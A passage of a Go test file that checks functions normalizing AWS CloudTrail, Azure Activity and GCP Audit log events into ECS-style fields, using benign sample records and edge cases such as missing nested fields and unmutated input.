	// caller is a dual-write: must appear in both user.name AND user.id
	t.Run("caller_dual_write", func(t *testing.T) {
		const callerValue = "user@example.com"
		raw := map[string]any{"caller": callerValue}
		out := NormalizeAzureEvent(raw)

		if got := out["user.name"]; got != callerValue {
			t.Errorf("caller dual-write: want user.name=%q, got %v", callerValue, got)
		}
		if got := out["user.id"]; got != callerValue {
			t.Errorf("caller dual-write: want user.id=%q, got %v", callerValue, got)
		}
	})

	// When caller is absent, neither user.name nor user.id should be written.
	t.Run("missing_caller_skips_dual_write", func(t *testing.T) {
		raw := map[string]any{"operationName": "Microsoft.Network/read"}
		out := NormalizeAzureEvent(raw)
		for _, absent := range []string{"user.name", "user.id"} {
			if _, ok := out[absent]; ok {
				t.Errorf("expected %q absent when caller missing, but it was present", absent)
			}
		}
	})
}

// TestNormalizeGCP_FieldMappings is Property 2 (cloud subset — GCP):
// For each source→target row in the GCP Audit Log mapping table, place a value v under
// the source key (or at the nested path) in an otherwise-minimal raw payload and assert
// that NormalizeGCPEvent(raw)[target] == v.
// The dual-write case (principalEmail → user.email AND user.name) is also covered.
// The nested-path cases use the exact nested map[string]any structure expected by
// nestedGet.
//
// Validates: Requirements 2.5, 2.6, 2.7, 2.8, 2.9, 2.10
func TestNormalizeGCP_FieldMappings(t *testing.T) {
	// flat rows — source key lives at the top level of raw
	type flatRow struct {
		source string
		target string
		value  any
	}

	flatRows := []flatRow{
		{"serviceName", "event.provider", "storage.googleapis.com"},
		{"methodName", "event.action", "storage.objects.create"},
		{"timestamp", "@timestamp", "2026-07-25T10:00:00Z"},
		{"severity", "log.level", "INFO"},
	}

	for _, r := range flatRows {
		raw := map[string]any{r.source: r.value}
		out := NormalizeGCPEvent(raw)
		got, ok := out[r.target]
		if !ok {
			t.Errorf("NormalizeGCPEvent: source=%q target=%q: key missing from output", r.source, r.target)
			continue
		}
		if !reflect.DeepEqual(r.value, got) {
			t.Errorf("NormalizeGCPEvent: source=%q target=%q: want %#v, got %#v", r.source, r.target, r.value, got)
		}
	}

	// protoPayload.authenticationInfo.principalEmail → dual write to user.email AND user.name
	t.Run("principalEmail_dual_write", func(t *testing.T) {
		const email = "alice@example.com"
		raw := map[string]any{
			"protoPayload": map[string]any{
				"authenticationInfo": map[string]any{
					"principalEmail": email,
				},
			},
		}
		out := NormalizeGCPEvent(raw)
		if got := out["user.email"]; got != email {
			t.Errorf("principalEmail dual-write: want user.email=%q, got %v", email, got)
		}
		if got := out["user.name"]; got != email {
			t.Errorf("principalEmail dual-write: want user.name=%q, got %v", email, got)
		}
	})

	// protoPayload.requestMetadata.callerIp → source.ip
	t.Run("callerIp_maps_to_source_ip", func(t *testing.T) {
		const ip = "203.0.113.5"
		raw := map[string]any{
			"protoPayload": map[string]any{
				"requestMetadata": map[string]any{
					"callerIp": ip,
				},
			},
		}
		out := NormalizeGCPEvent(raw)
		if got := out["source.ip"]; got != ip {
			t.Errorf("callerIp: want source.ip=%q, got %v", ip, got)
		}
	})

	// resource.type → cloud.service.name
	t.Run("resource_type_maps_to_cloud_service_name", func(t *testing.T) {
		const resType = "gcs_bucket"
		raw := map[string]any{
			"resource": map[string]any{
				"type": resType,
			},
		}
		out := NormalizeGCPEvent(raw)
		if got := out["cloud.service.name"]; got != resType {
			t.Errorf("resource.type: want cloud.service.name=%q, got %v", resType, got)
		}
	})

	// resource.labels.project_id → cloud.account.id
	t.Run("resource_labels_project_id_maps_to_cloud_account_id", func(t *testing.T) {
		const projectID = "my-gcp-project"
		raw := map[string]any{
			"resource": map[string]any{
				"labels": map[string]any{
					"project_id": projectID,
				},
			},
		}
		out := NormalizeGCPEvent(raw)
		if got := out["cloud.account.id"]; got != projectID {
			t.Errorf("resource.labels.project_id: want cloud.account.id=%q, got %v", projectID, got)
		}
	})

	// Missing protoPayload skips principalEmail and callerIp targets silently.
	t.Run("missing_protoPayload_skips_nested", func(t *testing.T) {
		raw := map[string]any{"serviceName": "compute.googleapis.com"}
		out := NormalizeGCPEvent(raw)
		for _, absent := range []string{"user.email", "user.name", "source.ip"} {
			if _, ok := out[absent]; ok {
				t.Errorf("expected %q absent when protoPayload missing, but it was present", absent)
			}
		}
	})

	// Missing resource skips cloud.service.name and cloud.account.id targets silently.
	t.Run("missing_resource_skips_nested", func(t *testing.T) {
		raw := map[string]any{"serviceName": "compute.googleapis.com"}
		out := NormalizeGCPEvent(raw)
		for _, absent := range []string{"cloud.service.name", "cloud.account.id"} {
			if _, ok := out[absent]; ok {
				t.Errorf("expected %q absent when resource missing, but it was present", absent)
			}
		}
	})
}

// TestNormalize_PipelineDispatch_Cloud is Property 3 (cloud subset):
// For each cloud DataType value, the correct normalizer is applied.
// Validates: Requirements 2.11, 2.12, 2.13
func TestNormalize_PipelineDispatch_Cloud(t *testing.T) {
	raw := map[string]any{
		"eventSource":   "s3.amazonaws.com",
		"operationName": "Microsoft.Compute/virtualMachines/write",
		"serviceName":   "storage.googleapis.com",
		"extraKey":      "should be preserved",
	}

	dispatch := func(dataType string, fields map[string]any) map[string]any {
		switch dataType {
		case "windows_events", "windows":
			return NormalizeWindowsEvent(fields)
		case "linux_logs", "linux", "auditd", "syslog":
			return NormalizeLinuxEvent(fields)
		case "aws_cloudtrail", "aws":
			return NormalizeAWSEvent(fields)
		case "azure_activity", "azure":
			return NormalizeAzureEvent(fields)
		case "gcp_audit", "gcp":
			return NormalizeGCPEvent(fields)
		}
		return fields
	}

	// AWS DataTypes
	for _, dt := range []string{"aws_cloudtrail", "aws"} {
		got := dispatch(dt, raw)
		want := NormalizeAWSEvent(raw)
		if !reflect.DeepEqual(want, got) {
			t.Errorf("DataType=%q: dispatch result does not match NormalizeAWSEvent", dt)
		}
	}

	// Azure DataTypes
	for _, dt := range []string{"azure_activity", "azure"} {
		got := dispatch(dt, raw)
		want := NormalizeAzureEvent(raw)
		if !reflect.DeepEqual(want, got) {
			t.Errorf("DataType=%q: dispatch result does not match NormalizeAzureEvent", dt)
		}
	}

	// GCP DataTypes
	for _, dt := range []string{"gcp_audit", "gcp"} {
		got := dispatch(dt, raw)
		want := NormalizeGCPEvent(raw)
		if !reflect.DeepEqual(want, got) {
			t.Errorf("DataType=%q: dispatch result does not match NormalizeGCPEvent", dt)
		}
	}

	// Unrecognized DataTypes — fields unchanged
	snapshot := deepCopyMap(raw)
	for _, dt := range []string{"unknown", "", "netflow"} {
		got := dispatch(dt, raw)
		if !reflect.DeepEqual(snapshot, got) {
			t.Errorf("DataType=%q: expected no-op, but fields changed", dt)
		}
	}
}

// TestNormalizeAWSEvent is a table-driven test covering at least 8 distinct
// field-mapping and edge cases for NormalizeAWSEvent.
//
// Validates: Requirements 2.14, 2.15
func TestNormalizeAWSEvent(t *testing.T) {
	type testCase struct {
		name  string
		input map[string]any
		check func(t *testing.T, out map[string]any)
	}

	cases := []testCase{
		{
			// Case 1: eventSource alone → event.provider
			name:  "eventSource maps to event.provider",
			input: map[string]any{"eventSource": "s3.amazonaws.com"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["event.provider"]; got != "s3.amazonaws.com" {
					t.Errorf("want event.provider=%q, got %v", "s3.amazonaws.com", got)
				}
			},
		},
		{
			// Case 2: userIdentity.arn nested path → user.id
			name: "userIdentity.arn maps to user.id",
			input: map[string]any{
				"userIdentity": map[string]any{
					"arn": "arn:aws:iam::123456789012:user/alice",
				},
			},
			check: func(t *testing.T, out map[string]any) {
				want := "arn:aws:iam::123456789012:user/alice"
				if got := out["user.id"]; got != want {
					t.Errorf("want user.id=%q, got %v", want, got)
				}
			},
		},
		{
			// Case 3: userIdentity.accountId nested path → cloud.account.id
			name: "userIdentity.accountId maps to cloud.account.id",
			input: map[string]any{
				"userIdentity": map[string]any{
					"accountId": "123456789012",
				},
			},
			check: func(t *testing.T, out map[string]any) {
				if got := out["cloud.account.id"]; got != "123456789012" {
					t.Errorf("want cloud.account.id=%q, got %v", "123456789012", got)
				}
			},
		},
		{
			// Case 4: Missing userIdentity → no nested ECS keys written
			// (user.id, user.type, cloud.account.id, user.name must all be absent)
			name:  "missing userIdentity skips all nested ECS keys",
			input: map[string]any{"eventName": "ListBuckets"},
			check: func(t *testing.T, out map[string]any) {
				for _, absent := range []string{"user.id", "user.type", "cloud.account.id", "user.name"} {
					if _, ok := out[absent]; ok {
						t.Errorf("expected %q absent when userIdentity missing, but it was present", absent)
					}
				}
			},
		},
		{
			// Case 5: String errorCode → event.outcome
			name:  "errorCode string maps to event.outcome",
			input: map[string]any{"errorCode": "AccessDenied"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["event.outcome"]; got != "AccessDenied" {
					t.Errorf("want event.outcome=%q, got %v", "AccessDenied", got)
				}
			},
		},
		{
			// Case 6: Unicode eventName → event.action preserved verbatim
			name:  "unicode eventName preserved in event.action",
			input: map[string]any{"eventName": "日本語事業"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["event.action"]; got != "日本語事業" {
					t.Errorf("want event.action=%q, got %v", "日本語事業", got)
				}
			},
		},
		{
			// Case 7: IPv6 sourceIPAddress → source.ip
			name:  "IPv6 sourceIPAddress maps to source.ip",
			input: map[string]any{"sourceIPAddress": "2001:db8::1"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["source.ip"]; got != "2001:db8::1" {
					t.Errorf("want source.ip=%q, got %v", "2001:db8::1", got)
				}
			},
		},
		{
			// Case 8: Full CloudTrail-like record with multiple fields — check all mapped keys
			name: "full CloudTrail record maps all known fields",
			input: map[string]any{
				"eventSource":     "ec2.amazonaws.com",
				"eventName":       "RunInstances",
				"awsRegion":       "us-west-2",
				"sourceIPAddress": "203.0.113.42",
				"eventTime":       "2026-07-25T10:00:00Z",
				"userAgent":       "aws-cli/2.0 Python/3.11",
				"requestID":       "req-abc-000111",
				"errorCode":       "InvalidParameterValue",
				"userIdentity": map[string]any{
					"arn":       "arn:aws:iam::999888777666:user/ops",
					"type":      "IAMUser",
					"accountId": "999888777666",
					"userName":  "ops",
				},
			},
			check: func(t *testing.T, out map[string]any) {
				expects := map[string]any{
					"event.provider":       "ec2.amazonaws.com",
					"event.action":         "RunInstances",
					"cloud.region":         "us-west-2",
					"source.ip":            "203.0.113.42",
					"@timestamp":           "2026-07-25T10:00:00Z",
					"user_agent.original":  "aws-cli/2.0 Python/3.11",
					"event.id":             "req-abc-000111",
					"event.outcome":        "InvalidParameterValue",
					"user.id":              "arn:aws:iam::999888777666:user/ops",
					"user.type":            "IAMUser",
					"cloud.account.id":     "999888777666",
					"user.name":            "ops",
				}
				for k, want := range expects {
					if got, ok := out[k]; !ok {
						t.Errorf("full record: key %q missing from output", k)
					} else if !reflect.DeepEqual(want, got) {
						t.Errorf("full record: key %q: want %#v, got %#v", k, want, got)
					}
				}
			},
		},
		{
			// Case 9 (bonus): Empty raw map returns non-nil map without panicking.
			name:  "empty raw map returns non-nil map",
			input: map[string]any{},
			check: func(t *testing.T, out map[string]any) {
				if out == nil {
					t.Error("want non-nil output map for empty input")
				}
			},
		},
		{
			// Case 10 (bonus): Non-map value for userIdentity silently skips nested fields.
			name:  "non-map userIdentity silently skips nested ECS keys",
			input: map[string]any{"userIdentity": "not-a-map"},
			check: func(t *testing.T, out map[string]any) {
				// The raw key must still be preserved.
				if _, ok := out["userIdentity"]; !ok {
					t.Error("raw key userIdentity missing from output")
				}
				// ECS nested targets must be absent.
				for _, absent := range []string{"user.id", "user.type", "cloud.account.id", "user.name"} {
					if _, ok := out[absent]; ok {
						t.Errorf("expected %q absent when userIdentity is a string, but it was present", absent)
					}
				}
			},
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			snapshot := deepCopyMap(tc.input)
			out := NormalizeAWSEvent(tc.input)
			tc.check(t, out)
			// Universal invariant: input must not be mutated.
			if !reflect.DeepEqual(snapshot, tc.input) {
				t.Error("NormalizeAWSEvent mutated the input map")
			}
		})
	}
}

// TestNormalizeAzureEvent is a table-driven test covering at least 5 distinct
// field-mapping and edge cases for NormalizeAzureEvent.
//
// Validates: Requirements 2.14, 2.15
func TestNormalizeAzureEvent(t *testing.T) {
	type testCase struct {
		name  string
		input map[string]any
		check func(t *testing.T, out map[string]any)
	}

	cases := []testCase{
		{
			// Case 1: caller dual-write → both user.name and user.id
			name:  "caller dual-write to user.name and user.id",
			input: map[string]any{"caller": "admin@corp.onmicrosoft.com"},
			check: func(t *testing.T, out map[string]any) {
				const want = "admin@corp.onmicrosoft.com"
				if got := out["user.name"]; got != want {
					t.Errorf("want user.name=%q, got %v", want, got)
				}
				if got := out["user.id"]; got != want {
					t.Errorf("want user.id=%q, got %v", want, got)
				}
			},
		},
		{
			// Case 2: subscriptionId → cloud.account.id
			name:  "subscriptionId maps to cloud.account.id",
			input: map[string]any{"subscriptionId": "aaaabbbb-cccc-dddd-eeee-ffffgggghhhhh"},
			check: func(t *testing.T, out map[string]any) {
				want := "aaaabbbb-cccc-dddd-eeee-ffffgggghhhhh"
				if got := out["cloud.account.id"]; got != want {
					t.Errorf("want cloud.account.id=%q, got %v", want, got)
				}
			},
		},
		{
			// Case 3: operationName → event.action
			name:  "operationName maps to event.action",
			input: map[string]any{"operationName": "Microsoft.KeyVault/vaults/write"},
			check: func(t *testing.T, out map[string]any) {
				want := "Microsoft.KeyVault/vaults/write"
				if got := out["event.action"]; got != want {
					t.Errorf("want event.action=%q, got %v", want, got)
				}
			},
		},
		{
			// Case 4: resultType → event.outcome
			name:  "resultType maps to event.outcome",
			input: map[string]any{"resultType": "Failure"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["event.outcome"]; got != "Failure" {
					t.Errorf("want event.outcome=%q, got %v", "Failure", got)
				}
			},
		},
		{
			// Case 5: Missing caller → user.name and user.id must be absent
			name:  "missing caller leaves user.name and user.id absent",
			input: map[string]any{"operationName": "Microsoft.Storage/storageAccounts/read"},
			check: func(t *testing.T, out map[string]any) {
				for _, absent := range []string{"user.name", "user.id"} {
					if _, ok := out[absent]; ok {
						t.Errorf("expected %q absent when caller missing, but it was present", absent)
					}
				}
			},
		},
		{
			// Case 6 (bonus): Full Azure Activity Log record — check all mapped keys
			name: "full Azure Activity Log record maps all known fields",
			input: map[string]any{
				"operationName":  "Microsoft.Network/networkSecurityGroups/write",
				"resourceType":   "Microsoft.Network/networkSecurityGroups",
				"resourceGroup":  "prod-rg",
				"subscriptionId": "11112222-3333-4444-5555-666677778888",
				"resourceId":     "/subscriptions/11112222/resourceGroups/prod-rg/providers/Microsoft.Network/networkSecurityGroups/my-nsg",
				"resultType":     "Success",
				"eventTimestamp": "2026-07-25T11:00:00Z",
				"correlationId":  "corr-xyz-789",
				"caller":         "devops@corp.onmicrosoft.com",
			},
			check: func(t *testing.T, out map[string]any) {
				expects := map[string]any{
					"event.action":        "Microsoft.Network/networkSecurityGroups/write",
					"azure.resource.type": "Microsoft.Network/networkSecurityGroups",
					"azure.resource.group": "prod-rg",
					"cloud.account.id":    "11112222-3333-4444-5555-666677778888",
					"azure.resource.id":   "/subscriptions/11112222/resourceGroups/prod-rg/providers/Microsoft.Network/networkSecurityGroups/my-nsg",
					"event.outcome":       "Success",
					"@timestamp":          "2026-07-25T11:00:00Z",
					"event.id":            "corr-xyz-789",
					"user.name":           "devops@corp.onmicrosoft.com",
					"user.id":             "devops@corp.onmicrosoft.com",
				}
				for k, want := range expects {
					if got, ok := out[k]; !ok {
						t.Errorf("full record: key %q missing from output", k)
					} else if !reflect.DeepEqual(want, got) {
						t.Errorf("full record: key %q: want %#v, got %#v", k, want, got)
					}
				}
			},
		},
		{
			// Case 7 (bonus): Empty raw map returns non-nil map without panicking.
			name:  "empty raw map returns non-nil map",
			input: map[string]any{},
			check: func(t *testing.T, out map[string]any) {
				if out == nil {
					t.Error("want non-nil output map for empty input")
				}
			},
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			snapshot := deepCopyMap(tc.input)
			out := NormalizeAzureEvent(tc.input)
			tc.check(t, out)
			// Universal invariant: input must not be mutated.
			if !reflect.DeepEqual(snapshot, tc.input) {
				t.Error("NormalizeAzureEvent mutated the input map")
			}
		})
	}
}

// TestNormalizeGCPEvent is a table-driven test covering at least 3 distinct
// field-mapping and edge cases for NormalizeGCPEvent.
//
// Validates: Requirements 2.14, 2.15
func TestNormalizeGCPEvent(t *testing.T) {
	type testCase struct {
		name  string
		input map[string]any
		check func(t *testing.T, out map[string]any)
	}

	cases := []testCase{
		{
			// Case 1: principalEmail dual-write → both user.email and user.name
			name: "principalEmail dual-write to user.email and user.name",
			input: map[string]any{
				"protoPayload": map[string]any{
					"authenticationInfo": map[string]any{
						"principalEmail": "sre@gcp-corp.com",
					},
				},
			},
			check: func(t *testing.T, out map[string]any) {
				const want = "sre@gcp-corp.com"
				if got := out["user.email"]; got != want {
					t.Errorf("want user.email=%q, got %v", want, got)
				}
				if got := out["user.name"]; got != want {
					t.Errorf("want user.name=%q, got %v", want, got)
				}
			},
		},
		{
			// Case 2: callerIp → source.ip  (via protoPayload.requestMetadata.callerIp)
			name: "callerIp maps to source.ip",
			input: map[string]any{
				"protoPayload": map[string]any{
					"requestMetadata": map[string]any{
						"callerIp": "34.120.0.1",
					},
				},
			},
			check: func(t *testing.T, out map[string]any) {
				if got := out["source.ip"]; got != "34.120.0.1" {
					t.Errorf("want source.ip=%q, got %v", "34.120.0.1", got)
				}
			},
		},
		{
			// Case 3: resource.labels.project_id → cloud.account.id
			name: "resource.labels.project_id maps to cloud.account.id",
			input: map[string]any{
				"resource": map[string]any{
					"labels": map[string]any{
						"project_id": "my-prod-project",
					},
				},
			},
			check: func(t *testing.T, out map[string]any) {
				if got := out["cloud.account.id"]; got != "my-prod-project" {
					t.Errorf("want cloud.account.id=%q, got %v", "my-prod-project", got)
				}
			},
		},
		{
			// Case 4 (bonus): IPv6 callerIp preserved verbatim in source.ip
			name: "IPv6 callerIp preserved in source.ip",
			input: map[string]any{
				"protoPayload": map[string]any{
					"requestMetadata": map[string]any{
						"callerIp": "2001:db8:85a3::8a2e:370:7334",
					},
				},
			},
			check: func(t *testing.T, out map[string]any) {
				want := "2001:db8:85a3::8a2e:370:7334"
				if got := out["source.ip"]; got != want {
					t.Errorf("want source.ip=%q, got %v", want, got)
				}
			},
		},
		{
			// Case 5 (bonus): Missing protoPayload → user.email, user.name, source.ip absent
			name:  "missing protoPayload skips nested ECS keys",
			input: map[string]any{"serviceName": "compute.googleapis.com"},
			check: func(t *testing.T, out map[string]any) {
				for _, absent := range []string{"user.email", "user.name", "source.ip"} {
					if _, ok := out[absent]; ok {
						t.Errorf("expected %q absent when protoPayload missing, but it was present", absent)
					}
				}
			},
		},
		{
			// Case 6 (bonus): Full GCP Audit Log record — check all mapped keys
			name: "full GCP Audit Log record maps all known fields",
			input: map[string]any{
				"serviceName": "storage.googleapis.com",
				"methodName":  "storage.objects.create",
				"timestamp":   "2026-07-25T12:00:00Z",
				"severity":    "NOTICE",
				"protoPayload": map[string]any{
					"authenticationInfo": map[string]any{
						"principalEmail": "builder@my-prod-project.iam.gserviceaccount.com",
					},
					"requestMetadata": map[string]any{
						"callerIp": "10.0.0.5",
					},
				},
				"resource": map[string]any{
					"type": "gcs_bucket",
					"labels": map[string]any{
						"project_id": "my-prod-project",
					},
				},
			},
			check: func(t *testing.T, out map[string]any) {
				const email = "builder@my-prod-project.iam.gserviceaccount.com"
				expects := map[string]any{
					"event.provider":    "storage.googleapis.com",
					"event.action":      "storage.objects.create",
					"@timestamp":        "2026-07-25T12:00:00Z",
					"log.level":         "NOTICE",
					"user.email":        email,
					"user.name":         email,
					"source.ip":         "10.0.0.5",
					"cloud.service.name": "gcs_bucket",
					"cloud.account.id":  "my-prod-project",
				}
				for k, want := range expects {
					if got, ok := out[k]; !ok {
						t.Errorf("full record: key %q missing from output", k)
					} else if !reflect.DeepEqual(want, got) {
						t.Errorf("full record: key %q: want %#v, got %#v", k, want, got)
					}
				}
			},
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			snapshot := deepCopyMap(tc.input)
			out := NormalizeGCPEvent(tc.input)
			tc.check(t, out)
			// Universal invariant: input must not be mutated.
			if !reflect.DeepEqual(snapshot, tc.input) {
				t.Error("NormalizeGCPEvent mutated the input map")
			}
		})
	}
}
